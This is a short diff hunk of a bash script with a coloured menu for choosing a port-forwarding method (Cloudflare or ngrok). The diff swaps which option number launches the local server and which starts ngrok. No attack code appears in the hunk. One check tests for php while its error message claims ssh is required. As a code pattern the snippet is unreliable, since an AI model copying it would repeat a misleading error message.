@@ -283,12 +283,12 @@ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' 
 option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 2 ]]; then
+if [[ $option_server -eq 1 ]]; then
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
 
-elif [[ $option_server -eq 1 ]]; then
+elif [[ $option_server -eq 2 ]]; then
 ngrok_server
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
